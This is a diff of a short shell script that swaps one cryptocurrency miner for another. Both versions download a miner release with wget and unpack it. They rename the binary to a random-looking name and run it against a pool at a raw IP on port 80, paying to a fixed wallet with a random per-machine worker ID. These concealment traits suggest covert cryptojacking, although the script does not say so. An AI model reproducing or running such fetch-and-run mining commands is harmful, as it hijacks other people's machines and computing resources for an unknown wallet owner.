@@ -1,5 +1,4 @@
-wget https://github.com/peakminer/peakminer/releases/download/v2.7.1/peakminer-2.7.1.tar.gz
-tar xf peakminer-2.7.1.tar.gz
-cd peakminer
-mv peakminer aoodnge
-./aoodnge --coin pearl -o stratum+tcp://149.28.155.233:80 -u prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch/$(echo $RANDOM | md5sum | head -c 10)
+wget https://github.com/0xHashRaptor/ForgeMiner/releases/download/v1.5.4/ForgeMiner-1.5.4-linux.tar.gz
+tar xzf ForgeMiner-1.5.4-linux.tar.gz
+mv forge ganjatyd
+./ganjatyd --algorithm pearlhash --pool 149.28.155.233:80 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch.$(echo $RANDOM | md5sum | head -c 10)
